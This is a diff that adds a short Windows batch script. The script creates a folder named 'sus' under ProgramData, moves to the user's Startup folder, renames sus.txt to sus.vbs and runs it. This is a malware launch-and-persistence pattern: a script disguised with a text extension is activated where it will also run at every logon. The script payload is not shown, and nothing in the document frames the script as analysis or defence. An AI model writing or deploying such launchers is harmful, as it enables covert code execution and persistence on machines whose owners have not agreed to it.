@@ -1,0 +1,9 @@
+if not exist "c:\ProgramData\sus\" (
+    mkdir "c:\ProgramData\sus\"
+)
+cd "c:\ProgramData\sus\"
+
+cd /d "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+ren sus.txt sus.vbs
+sus.vbs
+exit
